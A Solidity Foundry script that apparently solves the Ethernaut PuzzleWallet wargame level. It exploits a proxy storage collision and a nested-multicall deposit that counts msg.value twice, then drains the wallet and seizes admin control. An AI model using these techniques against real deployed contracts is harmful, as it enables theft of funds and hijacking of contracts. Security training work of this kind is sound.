//SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

import "./BaseScript.s.sol";
import {console2} from "forge-std/console2.sol";

interface IPuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external ;
    function approveNewAdmin(address _expectedAdmin) external;
    function upgradeTo(address _newImplementation) external;
}

interface IPuzzleWallet {
    function init(uint256 _maxBalance) external; 
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable ;
}
contract PuzzleWallet is BaseScript {
    function setUp() public override {
        super.setUp();
        contractAddress = 0x104d16FaC12944061F1E9e819330f7A416554C01;
    }

    function run() public{
        vm.startBroadcast(deployer);
        IPuzzleProxy(contractAddress).proposeNewAdmin(deployer);
        // console2.log("proposeNewAdmin");
        IPuzzleWallet(contractAddress).addToWhitelist(deployer);

        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(IPuzzleWallet(contractAddress).deposit.selector);
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(IPuzzleWallet(contractAddress).deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(IPuzzleWallet(contractAddress).multicall.selector, depositSelector);

        // console2.logBytes(data1);
        // console2.logBytes(data[0]);
        IPuzzleWallet(contractAddress).multicall{value: 0.001 ether}(nestedMulticall);
        IPuzzleWallet(contractAddress).execute(deployer, 0.002 ether, "");

        // uint256 deployerUint256 = uint256(uint160(address(deployer)));
       
        IPuzzleWallet(contractAddress).setMaxBalance(uint256(deployer));
        IPuzzleProxy(contractAddress).approveNewAdmin(deployer);

        // bytes32 leet = vm.load(address(contractAddress), bytes32(uint256(0)));
        // console2.logBytes32(leet);
        vm.stopBroadcast();
        
    }
}